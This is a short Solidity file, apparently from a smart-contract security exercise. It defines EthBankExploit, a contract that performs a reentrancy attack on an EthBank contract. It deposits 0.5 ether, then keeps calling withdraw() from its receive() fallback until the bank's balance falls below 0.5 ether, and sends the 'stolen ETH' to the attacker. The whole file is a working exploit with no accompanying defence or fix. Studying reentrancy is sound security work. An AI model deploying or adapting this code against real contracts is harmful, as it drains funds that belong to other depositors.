// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/console.sol";

interface IEthBank {
    function deposit() external payable;

    function withdraw() external payable;
}

contract EthBankExploit {
    IEthBank public bank;

    constructor(IEthBank _bank) {
        bank = _bank;
    }

    receive() external payable {
        // drain until try to get the most ETH 
        // 0.5 ether is the interval to drain each time
        if (address(bank).balance >= 0.5 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        // deposits 
        bank.deposit{value: 0.5 ether}();
        bank.withdraw();

        // send back stolen ETH to atacker address. 
        //why? transfer intead of call{value: address(this).balance}
        payable(msg.sender).transfer(address(this).balance);
    }
}
